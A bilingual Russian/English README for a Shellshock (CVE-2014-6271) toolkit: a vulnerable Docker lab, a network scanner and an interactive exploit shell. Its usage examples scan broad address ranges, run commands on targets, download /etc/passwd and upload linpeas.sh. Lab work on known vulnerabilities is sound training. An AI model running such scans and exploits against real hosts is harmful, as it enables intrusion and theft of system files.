# Shellshock Lab, Scanner & Exploit

Инструменты для работы с **Shellshock (CVE-2014-6271)**: уязвимая лаборатория, сканер и эксплойт.

| Файл | Назначение |
|---|---|
| `shellshock_docker_lab.sh` | Разворачивает уязвимый контейнер (Ubuntu 14.04 + Apache + CGI) |
| `shellshock_scanner.py` | Многопоточный сканер Shellshock |
| `shellshock_exploit.py` | Интерактивный шелл с upload/download и Tab-автодополнением |


## Лаборатория

Требования: Linux, Docker.

```
chmod +x shellshock_docker_lab.sh
```
```
sudo ./shellshock_docker_lab.sh           # порт 8080
```
```
sudo ./shellshock_docker_lab.sh 9090      # свой порт
```

Скрипт собирает образ, откатывает bash до уязвимой версии, поднимает Apache + CGI, проверяет уязвимость. Если порт занят - покажет чем занят и попросит ввести другой.

Успех:

```
[+] SUCCESS: лаборатория уязвима, RCE работает.

Остановка: docker rm -f shellshock-lab
```

## Сканер

```
pip install requests colorama psutil
```

```
python3 shellshock_scanner.py 192.168.11.165 8080
python3 shellshock_scanner.py 192.168.0.0/16 8080
python3 shellshock_scanner.py targets.txt 80,443,8080
python3 shellshock_scanner.py 10.0.0.0/24 8000-8100
```

Результаты - в `shellshock_results.txt` в формате `host:port`. Этот файл подхватывает эксплойт.

Поддерживает чекпоинт, многопоточность, авторегулировку под CPU/RAM.


## Эксплойт

```
pip install requests urllib3
```
```
python3 shellshock_exploit.py
```

Ищет файл целей `shellshock_results.txt` в текущем каталоге, рядом со скриптом.

Встроенные команды:

| Команда | Действие |
|---|---|
| `help`, `?` | Список команд |
| `exit`, `quit`, `q` | Выход |
| `! <cmd>` | Команда локально на атакующем |
| `download <remote> [local]` | Скачать файл с цели |
| `upload <local> [remote]` | Загрузить файл на цель |
| `cache-clear` | Сбросить кэш Tab-автодополнения |
| всё остальное | Shell-команда на цели |

Пример:

```
shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

shell> download /etc/passwd
[+] Скачано 1832 байт в passwd

shell> upload ./linpeas.sh /tmp/lp.sh
[+] Загружено 830030 байт в /tmp/lp.sh
```

## Типовой сценарий

```
sudo ./shellshock_docker_lab.sh
```
```
python3 shellshock_scanner.py 192.168.0.0/16 8080
```
```
python3 shellshock_exploit.py
```
---

# Shellshock Lab, Scanner & Exploit

Tools for working with **Shellshock (CVE-2014-6271)**: vulnerable lab, scanner, and exploit.

| File | Purpose |
|---|---|
| `shellshock_docker_lab.sh` | Deploys a vulnerable container (Ubuntu 14.04 + Apache + CGI) |
| `shellshock_scanner.py` | Multi-threaded Shellshock scanner |
| `shellshock_exploit.py` | Interactive shell with upload/download and tab completion |

---

## Lab

Requirements: Linux, Docker.

```
chmod +x shellshock_docker_lab.sh
```
```
sudo ./shellshock_docker_lab.sh           # port 8080
```
```
sudo ./shellshock_docker_lab.sh 9090      # custom port
```

The script builds the image, downgrades bash to the vulnerable version, starts Apache + CGI, and verifies the vulnerability. If the port is busy, it shows what's holding it and asks for another one.

Success:
```
[+] SUCCESS: лаборатория уязвима, RCE работает.

Stop: docker rm -f shellshock-lab
```

## Scanner

```
pip install requests colorama psutil
```

```
python3 shellshock_scanner.py 192.168.11.165 8080
python3 shellshock_scanner.py 192.168.0.0/16 8080
python3 shellshock_scanner.py targets.txt 80,443,8080
python3 shellshock_scanner.py 10.0.0.0/24 8000-8100
```

Results are written to `shellshock_results.txt` as `host:port`. The exploit picks this file up.

Supports checkpointing, multi-threading, auto-tuning based on CPU/RAM.


## Exploit

```
pip install requests urllib3
```
```
python3 shellshock_exploit.py
```

Looks for the target file `shellshock_results.txt` in the current directory and next to the script.

Built-in commands:

| Command | Action |
|---|---|
| `help`, `?` | List commands |
| `exit`, `quit`, `q` | Exit |
| `! <cmd>` | Run command locally on the attacker |
| `download <remote> [local]` | Download a file from the target |
| `upload <local> [remote]` | Upload a file to the target |
| `cache-clear` | Reset the tab-completion cache |
| anything else | Shell command on the target |

Example:

```
shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

shell> download /etc/passwd
[+] Скачано 1832 байт в passwd

shell> upload ./linpeas.sh /tmp/lp.sh
[+] Загружено 830030 байт в /tmp/lp.sh
```

## Typical workflow

```
sudo ./shellshock_docker_lab.sh
```
```
python3 shellshock_scanner.py 192.168.0.0/16 8080
```
```
python3 shellshock_exploit.py
```
